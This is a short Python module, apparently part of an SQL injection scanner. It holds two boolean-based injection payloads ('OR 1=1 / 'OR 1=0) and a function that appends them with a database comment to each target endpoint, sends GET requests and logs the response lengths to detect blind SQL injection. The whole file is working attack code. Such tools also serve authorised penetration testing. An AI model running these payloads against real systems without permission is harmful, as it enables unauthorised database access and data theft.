import requests

from SQLi.confirm_sqli import *
from utils.auxiliary import *

payloads = [
    "'OR 1=0",
    "'OR 1=1"
]


def try_boolean_sqli(url, options: list):
    l = Auxiliary(__name__)
    l.set_config()
    vuln_endpoints = options[0]
    db_comment = options[1]
    for endp in vuln_endpoints:
        for pld in payloads:
            pld = requests.utils.quote(pld + db_comment)
            r = requests.get(url=url + endp + pld)
            l.logger.info(
                f"[*] Trying blind SQLi on endpoint {url + endp + pld}")
            l.logger.info(len(r.text))
